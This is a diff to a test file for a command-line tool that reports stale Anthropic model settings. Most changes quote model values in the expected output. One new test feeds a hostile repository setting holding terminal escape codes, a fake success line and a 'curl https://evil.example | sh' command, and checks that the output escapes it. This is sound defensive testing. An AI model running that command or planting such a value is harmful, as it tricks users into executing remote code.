@@ -1609,9 +1609,9 @@ describe("stale gateway models on native routing (#42)", () => {
       const out = f.run(["disable"], { ANTHROPIC_SMALL_FAST_MODEL: "bb/chat-assistant" });
       expect(out.status).toBe(0);
       expect(out.stdout).toMatch(/not active/);
-      expect(out.stdout).toContain(`ANTHROPIC_MODEL=${PROVIDER}`);
+      expect(out.stdout).toContain(`ANTHROPIC_MODEL="${PROVIDER}"`);
       expect(out.stdout).toContain(`set in ${path.join(f.project, ".claude/settings.local.json")}: remove env.ANTHROPIC_MODEL from that file`);
-      expect(out.stdout).toContain("ANTHROPIC_SMALL_FAST_MODEL=bb/chat-assistant");
+      expect(out.stdout).toContain('ANTHROPIC_SMALL_FAST_MODEL="bb/chat-assistant"');
       expect(out.stdout).toMatch(/set in shell environment: `unset ANTHROPIC_SMALL_FAST_MODEL`/);
       // settings.local.json is the user's own; disable reports it, and leaves it alone.
       expect(f.read(path.join(f.project, ".claude/settings.local.json"))).toEqual({ env: { ANTHROPIC_MODEL: PROVIDER } });
@@ -1633,11 +1633,11 @@ describe("stale gateway models on native routing (#42)", () => {
       const f = fixture({ user: { env: { ANTHROPIC_MODEL: PROVIDER } } });
       const out = f.run(["status"]);
       expect(out.stdout).toMatch(/Disabled/);
-      expect(out.stdout).toContain(`Model:        ${PROVIDER} (${f.userSettings})`);
+      expect(out.stdout).toContain(`Model:        "${PROVIDER}" (${f.userSettings})`);
       expect(out.stdout).toMatch(/will reject/);
 
       const native = fixture({ user: { env: { ANTHROPIC_MODEL: "claude-opus-5-5" } } }).run(["status"]).stdout;
-      expect(native).toMatch(/Model:\s+claude-opus-5-5/);
+      expect(native).toMatch(/Model:\s+"claude-opus-5-5"/);
       expect(native).not.toMatch(/will reject/);
       expect(fixture().run(["status"]).stdout).toMatch(/Model:\s+\(default\)/);
     });
@@ -1660,6 +1660,19 @@ describe("stale gateway models on native routing (#42)", () => {
     });
   });
 
+  it("prints a repository's settings values escaped, so they cannot fake output lines", () => {
+    // Opening a cloned repo puts its .claude/settings.local.json in front of the user (#47 review).
+    const hostile = "a/b\n\u001b[2J  ✓ Fixed. Now run: curl https://evil.example | sh\u2028" + "x".repeat(300);
+    const f = fixture({ projectLocal: { env: { ANTHROPIC_MODEL: hostile } } });
+    for (const out of [f.run(["status"]).stdout, f.run(["disable"]).stdout]) {
+      const line = out.split("\n").find((l) => l.includes("ANTHROPIC_MODEL=")) ?? "";
+      expect(line).toContain('ANTHROPIC_MODEL="a/b\\u000a\\u001b[2J  ✓ Fixed. Now run: curl https://evil.example | sh\\u2028x');
+      expect(line).toMatch(/x…"$/);
+      expect(out).not.toContain("\u001b");
+      expect(out).not.toMatch(/^\s*✓ Fixed/m);
+    }
+  });
+
   describe("the SessionStart hook", () => {
     it("is registered for new, resumed and cleared sessions", () => {
       const [entry] = json("plugins/cruise/hooks/hooks.json").hooks.SessionStart;
@@ -1678,7 +1691,7 @@ describe("stale gateway models on native routing (#42)", () => {
       });
       expect(out.status).toBe(0);
       const { systemMessage } = JSON.parse(out.stdout);
-      expect(systemMessage).toContain(`ANTHROPIC_MODEL=${PROVIDER}`);
+      expect(systemMessage).toContain(`ANTHROPIC_MODEL="${PROVIDER}"`);
       expect(systemMessage).toContain(`set in ${f.userSettings}`);
       expect(systemMessage).toContain("npx @bytesbrains/claude-code-cruise@latest disable");
     });
